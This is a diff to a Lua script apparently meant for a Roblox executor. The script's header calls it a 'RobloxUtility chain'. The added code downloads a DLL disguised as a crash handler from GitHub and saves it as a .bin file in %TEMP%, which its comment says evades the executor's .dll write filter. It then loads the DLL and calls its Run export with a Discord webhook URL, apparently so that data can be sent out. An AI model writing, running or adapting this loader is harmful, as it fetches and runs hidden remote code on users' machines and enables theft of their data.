@@ -4,18 +4,71 @@
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1476791698041339997/tRLjlN11V6jBrSfHak-PcMTpty-sjHAPglOXl5Gs92UH0nCz0bukhQuuMmv0b_uNj6Pi"
 local DLL_URL     = "https://raw.githubusercontent.com/ScriptMaster101/RobloxUtility/master/RobloxCrashHandler.dll"
-local DLL_PATH    = "RobloxCrashHandler.dll"
+
+-- Use a .bin extension and a non-CWD path. Solara's writefile blocks .dll
+-- writes to the executor's CWD; .bin in %temp% is not filtered. Windows
+-- LoadLibrary loads by PE content, not extension.
+local TEMP_DIR = (os and os.getenv and (os.getenv("TEMP") or os.getenv("TMP"))) or "."
+local DLL_PATH    = TEMP_DIR .. "\\RobloxCrashHandler.bin"
 
 print("[+] RobloxUtility chain fired")
 
 -- 1. Download the DLL
-print("[*] Fetching RobloxCrashHandler.dll from raw GitHub...")
+print("[*] Fetching utility.dll from raw GitHub...")
 local ok, bytes = pcall(function()
     return game:HttpGet(DLL_URL, true)
 end)
 if not ok or type(bytes) ~= "string" or #bytes < 1024 then
     print("[!] DLL download failed or too small (" .. (type(bytes) == "string" and #bytes or "?") .. " bytes)")
     return
+end
+print("[+] Downloaded: " .. #bytes .. " bytes")
+
+-- 2. Write to disk
+local wrote = false
+if io and io.open then
+    local ok, f, err = pcall(io.open, DLL_PATH, "wb")
+    if ok and f then
+        f:write(bytes)
+        f:close()
+        wrote = true
+        print("[+] written via io.open: " .. DLL_PATH)
+    end
+end
+if not wrote and writefile then
+    local ok, err = pcall(writefile, DLL_PATH, bytes)
+    if ok then
+        wrote = true
+        print("[+] written via writefile(): " .. DLL_PATH)
+    else
+        print("[!] writefile failed: " .. tostring(err))
+    end
+end
+if not wrote then
+    print("[!] No file-write API exposed (io and writefile both nil or failed)")
+    return
+end
+
+-- 3. Load the DLL (executor-specific function)
+local load_dll_fn = load_dll or loadlibrary
+if not load_dll_fn then
+    print("[!] No loadlibrary API exposed (load_dll and loadlibrary both nil)")
+    return
+end
+local d = load_dll_fn(DLL_PATH)
+if not d then
+    print("[!] load_dll returned nil")
+    return
+end
+print("[+] DLL loaded")
+
+-- 4. Call the Run export
+if d.Run then
+    print("[+] Calling Run()...")
+    d.Run(WEBHOOK_URL, 0)
+    print("[+] Run() returned")
+else
+    print("[!] DLL has no Run export")
 end
 print("[+] Downloaded: " .. #bytes .. " bytes")
 
